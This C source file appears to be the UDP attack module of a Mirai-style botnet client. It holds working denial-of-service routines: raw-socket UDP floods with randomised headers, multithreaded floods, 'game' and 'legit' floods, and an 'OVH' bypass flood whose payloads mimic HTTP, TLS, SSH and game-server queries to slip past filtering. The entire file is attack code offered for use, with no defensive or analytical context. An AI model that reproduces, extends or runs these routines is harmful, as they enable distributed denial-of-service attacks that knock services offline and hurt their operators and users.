#define _GNU_SOURCE
#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <time.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <sys/time.h>
#include <pthread.h>
#include <fcntl.h>
#include <errno.h>

#include "headers/attacks.h"
#include "headers/utils.h"
#include "headers/checksum.h"
#include "headers/protocol.h"
#include "headers/cnc_protocol.h"
#include "headers/rand.h"

#define SIZE_UDP 1400
#define SIZE_VSE 9096

void attack_udp_generic(char *ip, int port, int duration, struct attack_option *opts, uint8_t opts_len) {
    int payload_size = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, SIZE_UDP);
    int sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if(sock < 0){
#ifdef DEBUG
        perror("sock");
#endif
        return;
    }

    if (sport != 0xffff) {
        struct sockaddr_in bind_addr;
        util_zero(&bind_addr, sizeof(bind_addr));
        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = htons(sport);
        bind_addr.sin_addr.s_addr = INADDR_ANY;
        if (bind(sock, (struct sockaddr *)&bind_addr, sizeof(bind_addr)) < 0) {
        }
    }

    struct sockaddr_in dst;
    util_zero(&dst, sizeof(dst));
    dst.sin_family = AF_INET;
    dst.sin_port = htons(port);
    dst.sin_addr.s_addr = inet_addr(ip);

    if(connect(sock, (struct sockaddr*)&dst, sizeof(dst)) < 0) {
        close(sock);
        return;
    }

    unsigned char *payload = malloc(payload_size);
    if (!payload) return;
    util_zero(payload, payload_size);

    while(1){
        send(sock, payload, payload_size, 0);
    }

    free(payload);
    close(sock);
}

void attack_udp_raw(char *ip, int port, int duration, struct attack_option *opts, uint8_t opts_len){
    int payload_size = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, SIZE_UDP);
    int sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    int ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 0xffff);
    int ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(sock < 0) {
#ifdef DEBUG
        perror("sock");
#endif
        return;
    }

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    char *pkt = malloc(payload_size);
    if (!pkt) return;
    util_zero(pkt, payload_size);

    struct iphdr *iph = (struct iphdr *)pkt;
    struct udphdr *udph = (struct udphdr *)(pkt + sizeof(struct iphdr));
    char *payload = pkt + sizeof(struct iphdr) + sizeof(struct udphdr);

    struct sockaddr_in dst;
    dst.sin_family = AF_INET;
    dst.sin_addr.s_addr = inet_addr(ip);
    dst.sin_port = htons(port);

    ipv4_t saddr = util_local_addr();
    if (saddr == 0)
        saddr = inet_addr("0.0.0.0");

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = ip_tos;
    iph->tot_len = htons(payload_size);
    iph->frag_off = 0;
    iph->protocol = IPPROTO_UDP;
    iph->saddr = saddr;
    iph->daddr = inet_addr(ip);

    udph->dest = htons(port);
    udph->len = htons(payload_size - sizeof(struct iphdr));

    while (1) {
        rand_str(payload, payload_size - sizeof(struct iphdr) - sizeof(struct udphdr));

        iph->id  = htons(rand_next() & 0xffff);
        iph->ttl = (ip_ttl == 0xffff) ? (1 + (rand_next() % 255)) : ip_ttl;
        udph->source = (sport == 0xffff) ? htons(rand_next() % 65536) : htons(sport);

        iph->check = 0;
        iph->check = cks((unsigned short*)pkt, sizeof(struct iphdr));

        udph->check = 0;
        udph->check = checksum_tcpudp(iph, udph, udph->len, payload_size - sizeof(struct iphdr));

        sendto(sock, pkt, payload_size, 0, (struct sockaddr*)&dst, sizeof(dst));
    }

    free(pkt);
    close(sock);
}

void attack_udp_hex(char *ip, int port, int duration, struct attack_option *opts, uint8_t opts_len){
    int payload_size = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, SIZE_UDP);
    int sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if(sock < 0){
        perror("sock");
        return;
    }

    if (sport != 0xffff) {
        struct sockaddr_in bind_addr;
        util_zero(&bind_addr, sizeof(bind_addr));
        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = htons(sport);
        bind_addr.sin_addr.s_addr = INADDR_ANY;
        bind(sock, (struct sockaddr *)&bind_addr, sizeof(bind_addr));
    }

    struct sockaddr_in dst;
    util_zero(&dst, sizeof(dst));
    dst.sin_family = AF_INET;
    dst.sin_port = htons(port);
    dst.sin_addr.s_addr = inet_addr(ip);

    if(connect(sock, (struct sockaddr*)&dst, sizeof(dst)) < 0) {
        close(sock);
        return;
    }

    unsigned char *payload = malloc(payload_size);
    if (!payload) return;

    while(1){
        if (payload_size > 0)
            rand_str(payload, payload_size);
        send(sock, payload, payload_size, 0);
    }

    free(payload);
    close(sock);
}

struct udp_thread_data {
    char ip[16];
    int port;
    int payload_size;
};

void *udp_threads_flood(void *arg) {
    struct udp_thread_data *data = (struct udp_thread_data *)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) pthread_exit(NULL);

    struct sockaddr_in dst;
    util_zero(&dst, sizeof(dst));
    dst.sin_family = AF_INET;
    dst.sin_port = htons(data->port);
    dst.sin_addr.s_addr = inet_addr(data->ip);

    if (connect(sock, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
        close(sock);
        pthread_exit(NULL);
    }

    unsigned char *payload = malloc(data->payload_size);
    if (!payload) {
        close(sock);
        pthread_exit(NULL);
    }

    while (1) {
        if (data->payload_size > 0) {
            rand_str(payload, data->payload_size);
        }
        send(sock, payload, data->payload_size, 0);
    }

    free(payload);
    close(sock);
    pthread_exit(NULL);
}

void attack_udp_threads(char *ip, int port, int duration, struct attack_option *opts, uint8_t opts_len) {
    int payload_size = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, SIZE_UDP);

    int num_threads = attack_get_opt_int(opts_len, opts, ATK_OPT_THREADS, 0);
    if (num_threads == 0) {
        num_threads = countcpu();
    }

    if (num_threads > 128) num_threads = 128;

    pthread_t threads[num_threads];
    struct udp_thread_data data;

    util_strncpy(data.ip, ip, 15);
    data.port = port;
    data.payload_size = payload_size;

    for (int i = 0; i < num_threads; i++) {
        pthread_create(&threads[i], NULL, udp_threads_flood, (void *)&data);
    }

    sleep(duration);

    for (int i = 0; i < num_threads; i++) {
        pthread_cancel(threads[i]);
    }
}


void attack_udp_game(char *ip, int port, int duration, struct attack_option *opts, uint8_t opts_len)
{
    int sock;
    struct sockaddr_in addr;
    int sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 1024);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);

    if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
        return;

    if (sport != 0xffff)
    {
        struct sockaddr_in bind_addr;
        util_zero(&bind_addr, sizeof (struct sockaddr_in));
        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = htons(sport);
        bind_addr.sin_addr.s_addr = 0;
        bind(sock, (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in));
    }

    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip);

    connect(sock, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));

    char *data = malloc(data_len);
    if (!data) return;

    while (TRUE)
    {
        if (data_rand)
            rand_str(data, data_len);

        send(sock, data, data_len, MSG_NOSIGNAL);
    }

    free(data);
    close(sock);
}

void attack_udp_legit(char *ip, int port, int duration, struct attack_option *opts, uint8_t opts_len)
{
    int fd;
    struct sockaddr_in target_addr;
    struct sockaddr_in bind_addr;
    char *pkt;

    util_zero(&target_addr, sizeof(target_addr));
    util_zero(&bind_addr, sizeof(bind_addr));

    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);

    target_addr.sin_family = AF_INET;
    target_addr.sin_addr.s_addr = inet_addr(ip);
    target_addr.sin_port = (port == 0xffff) ? rand_next() : htons(port);

    if ((fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
        return;

    bind_addr.sin_family = AF_INET;
    bind_addr.sin_port = (sport == 0xffff) ? rand_next() : htons(sport);
    bind_addr.sin_addr.s_addr = 0;

    bind(fd, (struct sockaddr *)&bind_addr, sizeof(struct sockaddr_in));
    connect(fd, (struct sockaddr *)&target_addr, sizeof(struct sockaddr_in));

    pkt = calloc(1400, sizeof(char));

    while (TRUE)
    {
        uint16_t data_len = rand_next_range(700, 1000);
        rand_str(pkt, data_len);

        send(fd, pkt, data_len, MSG_NOSIGNAL);
    }
}

#define MIN_PAYLOAD 1500
#define MAX_PAYLOAD 4096

struct ovh_thread_data {
    char ip[16];
    int port;
    int duration;
    char host[64];
    volatile int *stop;
    int thread_id;
};

static void hyper_chaos_payload(char *buf, int size, int thread_id, char *host, unsigned int *seed) {
    int base_type = rand_next() % 100;

    if (base_type < 35) {
        const char *methods[15] = {"GET", "POST", "HEAD", "OPTIONS", "PUT", "DELETE", "TRACE", "CONNECT", "PATCH", "PROPFIND", "PROPPATCH", "MKCOL", "COPY", "MOVE", "LOCK"};
        int m = rand_next() % 15;

        char ua[512];
        snprintf(ua, sizeof(ua), "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.%d.%d Safari/537.36",
                 rand_next()%120, rand_next()%4000, rand_next()%300);

        char headers[1024];
        snprintf(headers, sizeof(headers),
                "%s /%d/%d HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: %s\r\n"
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                "Accept-Language: en-US,en;q=0.5\r\n"
                "Accept-Encoding: gzip, deflate, br\r\n"
                "Connection: %s\r\n"
                "Upgrade-Insecure-Requests: 1\r\n"
                "Cache-Control: max-age=0\r\n\r\n",
                methods[m], rand_next(), rand_next(), host, ua,
                (rand_next()%2) ? "keep-alive" : "close");

        int header_len = util_strlen(headers);
        util_memcpy(buf, headers, header_len < size ? header_len : size);

        for(int i = header_len; i < size; i++) {
            buf[i] = (rand_next() % 94) + 32;
        }
    }
    else if (base_type < 55) {
        int magic = rand_next() % 8;
        int offset = 0;

        switch(magic) {
            case 0: util_memcpy(buf, "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n", 24); offset = 24; break;
            case 1: util_memcpy(buf, "\x16\x03\x01\x00\xdc\x01\x00\x00\xd8\x03\x03", 11); offset = 11; break;
            case 2: util_memcpy(buf, "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1", 35); offset = 35; break;
            case 3: util_memcpy(buf, "USER anonymous\r\nPASS user@example.com\r\n", 36); offset = 36; break;
            case 4: util_memcpy(buf, "EHLO example.com\r\nMAIL FROM:<test@example.com>\r\n", 44); offset = 44; break;
            case 5: buf[0] = 0x12; buf[1] = 0x34; buf[2] = 0x01; buf[3] = 0x00; buf[4] = 0x00; buf[5] = 0x01; offset = 6; break;
            case 6: util_zero(buf, 48); util_memcpy(buf, "\x1b", 1); offset = 48; break;
            default: for(int i = 0; i < 16; i++) buf[i] = rand_next(); offset = 16; break;
        }

        for(int i = offset; i < size; i++) {
            if (i % 4 == 0) *(uint32_t*)(buf + i) = rand_next();
        }
    }
    else if (base_type < 80) {
        util_memcpy(buf, "\xFF\xFF\xFF\xFF", 4);
        const char *queries[20] = {"TSource Engine Query\x00", "U\x00\x00\x00\x00", "V\x00\x00\x00\x00", "getchallenge\x00", "getstatus\x00", "getinfo\x00", "players\x00", "rules\x00", "challenge rcon \x00", "info\x00", "ping\x00", "status\x00", "\\chaos\\protocol\\\x00", "A2S_PLAYER\x00", "A2S_RULES\x00", "connect\x00", "valve\x00", "steam\x00", "source\x00", "query\x00"};
        int q = rand_next() % 20;
        size_t qlen = util_strlen(queries[q]);
        util_memcpy(buf + 4, queries[q], qlen);
        for(int i = 4 + qlen; i < size; i++) buf[i] = (i % 16 < 8) ? rand_next() : 0x00;
    }
    else {
        int chaos = rand_next() % 15;
        switch(chaos) {
            case 0: for(int i = 0; i < size; i++) buf[i] = ((i * 0x9E3779B9) ^ rand_r(seed)) & 0xFF; break;
            case 1: for(int i = 0; i < size; i++) buf[i] = (rand_r(seed) & ~i) | (i & rand_r(seed)); break;
            case 2: for(int i = 0; i < size; i += 8) { uint64_t pattern = ((uint64_t)rand_r(seed) << 32) | rand_r(seed); for(int j = 0; j < 8 && i + j < size; j++) buf[i + j] = (pattern >> (j * 8)) & 0xFF; } break;
            case 3: for(int i = 0; i < size; i++) buf[i] = (i % 20 < 10) ? 0xFF : 0x00; break;
            case 4: for(int i = 0; i < size; i++) buf[i] = (rand_r(seed) % 100 < 70) ? rand_r(seed) : 0x00; break;
            case 5: for(int i = 0; i < size; i++) buf[i] = (i % 2) ? 0xFF : 0x00; break;
            case 6: for(int i = 0; i < size; i++) buf[i] = (i * 255) / size; break;
            case 7: for(int i = 0; i < size; i++) buf[i] = 255 - ((i * 255) / size); break;
            case 8: for(int i = 0; i < size; i++) buf[i] = (((i / 8) % 2) ^ ((i % 8) % 2)) ? 0xFF : 0x00; break;
            case 9: for(int i = 0; i < size; i++) buf[i] = ((i + i/8) % 16 < 8) ? 0xFF : 0x00; break;
            case 10: for(int i = 0; i < size; i++) { buf[i] = (rand_r(seed) % 256); if (rand_r(seed) % 100 < 5) i += rand_r(seed) % 20; } break;
            case 11: for(int i = 0; i < size; i++) buf[i] = (rand_r(seed) % 2) * 0xFF; break;
            case 12: for(int i = 0; i < size; i++) buf[i] = "0123456789ABCDEF"[rand_r(seed) % 16]; break;
            case 13: for(int i = 0; i < size; i++) buf[i] = (rand_r(seed) % 32); break;
            default: for(int i = 0; i < size; i++) buf[i] = rand_r(seed);
        }
    }
}

static void *ovh_worker(void *arg) {
    struct ovh_thread_data *data = (struct ovh_thread_data *)arg;
    char buf[MAX_PAYLOAD];
    struct sockaddr_in target;
    unsigned int seed = time(NULL) ^ (uintptr_t)pthread_self();

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) pthread_exit(NULL);

    int sock_buf = 1024 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sock_buf, sizeof(sock_buf));
    fcntl(sock, F_SETFL, O_NONBLOCK);

    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(data->port);
    target.sin_addr.s_addr = inet_addr(data->ip);

    connect(sock, (struct sockaddr *)&target, sizeof(target));

    while (!*(data->stop)) {
        int payload_size = MIN_PAYLOAD + rand_r(&seed) % (MAX_PAYLOAD - MIN_PAYLOAD + 500);
        if (payload_size > MAX_PAYLOAD) payload_size = MAX_PAYLOAD;

        hyper_chaos_payload(buf, payload_size, data->thread_id, data->host, &seed);
        send(sock, buf, payload_size, MSG_DONTWAIT);
    }

    close(sock);
    pthread_exit(NULL);
}

void attack_udp_ovh(char *ip, int port, int duration, struct attack_option *opts, uint8_t opts_len) {
    int num_threads = attack_get_opt_int(opts_len, opts, ATK_OPT_THREADS, 0);
    if (num_threads == 0) num_threads = sysconf(_SC_NPROCESSORS_ONLN);
    if (num_threads > 128) num_threads = 128;

    char *host = attack_get_opt_str(opts_len, opts, ATK_OPT_DOMAIN, "ovh.com");

    pthread_t threads[num_threads];
    struct ovh_thread_data data[num_threads];
    volatile int stop = 0;

    for (int i = 0; i < num_threads; i++) {
        util_strncpy(data[i].ip, ip, 15);
        data[i].port = port;
        data[i].duration = duration;
        util_strncpy(data[i].host, host, 63);
        data[i].stop = &stop;
        data[i].thread_id = i;

        pthread_create(&threads[i], NULL, ovh_worker, (void *)&data[i]);
    }

    sleep(duration);
    stop = 1;

    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }
}
